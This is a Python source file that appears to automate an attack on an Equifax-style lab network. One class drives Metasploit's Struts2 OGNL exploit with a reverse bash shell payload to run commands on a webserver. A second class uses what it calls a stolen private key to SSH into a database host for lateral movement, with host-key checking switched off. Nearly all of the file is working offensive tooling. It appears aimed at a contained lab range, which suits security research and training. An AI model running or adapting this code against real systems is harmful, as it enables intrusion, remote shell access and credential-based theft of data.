import shlex
import subprocess
from abc import ABC, abstractmethod


# ---------------------------------------------------------------------------
# Shared interface: every "hand" knows how to run ONE command and return its
# text output. WebShell (webserver) and SshRunner (database) both fit this.
# ---------------------------------------------------------------------------
class CommandRunner(ABC):
    @abstractmethod
    def run(self, command: str) -> str:
        raise NotImplementedError


# Markers we wrap around the real output so we can pull it out of Metasploit's
# noisy logs. They just need to be words unlikely to collide with real output.
_BEGIN = "___INCALMO_BEGIN___"
_END = "___INCALMO_END___"


# ---------------------------------------------------------------------------
# Hand #1: the WEBSERVER, reached through the Struts bug via Metasploit.
# Each run() drives Metasploit once: exploit -> shell -> run one command.
# ---------------------------------------------------------------------------
class WebShell(CommandRunner):
    def __init__(
        self,
        rhost: str = "192.168.201.2",        # webserver address INSIDE the lab network
        rport: int = 8080,
        target_uri: str = "/fileupload/upload.action",
        docker_network: str = "equifax_labnet",
        msf_image: str = "metasploitframework/metasploit-framework",
        session_wait: int = 10,              # seconds to wait for the shell to call back
    ):
        self.rhost = rhost
        self.rport = rport
        self.target_uri = target_uri
        self.docker_network = docker_network
        self.msf_image = msf_image
        self.session_wait = session_wait

    def run(self, command: str) -> str:
        # Build the docker+msfconsole command, run it, pull the output back out.
        argv = self._build_tool_command(command)
        result = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            timeout=180,                      # msf startup (~30s) + wait + exploit
        )
        return self._extract_output(result.stdout)

    def _build_tool_command(self, command: str) -> list[str]:
        # On the target shell: print BEGIN, run the real command, print END.
        # Join with '&&' (not ';') because msfconsole treats ';' as its own
        # command separator and would break the line.
        wrapped = f"echo {_BEGIN} && {command} && echo {_END}"

        # The msfconsole script: the exact steps done by hand, plus a short
        # sleep to let the shell connect back, then run our command on it.
        msf_script = "; ".join([
            "use exploit/multi/http/struts2_content_type_ognl",
            f"set RHOSTS {self.rhost}",
            f"set RPORT {self.rport}",
            f"set TARGETURI {self.target_uri}",
            "set payload cmd/unix/reverse_bash",
            "run -j",                          # fire it; handler runs as a background job
            f"sleep {self.session_wait}",      # wait for the target to connect back
            f'sessions -c "{wrapped}"',        # run our command on the new shell session
            "exit -y",
        ])

        return [
            "docker", "run", "--rm",
            "--network", self.docker_network,
            self.msf_image,
            "./msfconsole", "-q", "-x", msf_script,
        ]

    def _extract_output(self, raw: str) -> str:
        # The markers also appear in Metasploit's "Running '...'" echo line, so
        # take the text after the LAST begin marker, up to the next end marker.
        if _BEGIN in raw and _END in raw:
            return raw.split(_BEGIN)[-1].split(_END)[0].strip()
        # Markers missing => something went wrong; hand back the raw log to debug.
        return raw.strip()


# ---------------------------------------------------------------------------
# Hand #2: the DATABASE, reached over SSH with the stolen private key.
# Same .run() interface; different machine. This is the "lateral move" result.
# ---------------------------------------------------------------------------
class SshRunner(CommandRunner):
    def __init__(
        self,
        host: str,
        user: str,
        private_key: str,
        docker_network: str = "equifax_labnet",
        image: str = "equifax-webserver",     # local image that ships an ssh client
    ):
        self.host = host
        self.user = user
        self.private_key = private_key
        self.docker_network = docker_network
        self.image = image

    def run(self, command: str) -> str:
        # Feed the key in via stdin, write it to a file inside the container,
        # then ssh. This avoids quoting the multi-line key and key-file
        # permission complaints.
        remote = (
            "cat > /tmp/k && chmod 600 /tmp/k && "
            "ssh -i /tmp/k "
            "-o StrictHostKeyChecking=no "
            "-o UserKnownHostsFile=/dev/null "
            "-o BatchMode=yes "
            f"{self.user}@{self.host} {shlex.quote(command)}"
        )
        argv = [
            "docker", "run", "--rm", "-i",     # -i so the container can read stdin
            "--network", self.docker_network,
            self.image,
            "bash", "-c", remote,
        ]
        result = subprocess.run(
            argv,
            input=self.private_key + "\n",     # the stolen key (+ trailing newline)
            capture_output=True,
            text=True,
            timeout=60,
        )
        return result.stdout.strip()


if __name__ == "__main__":
    # Quick manual test: should print "tomcat"
    shell = WebShell()
    print(shell.run("whoami"))
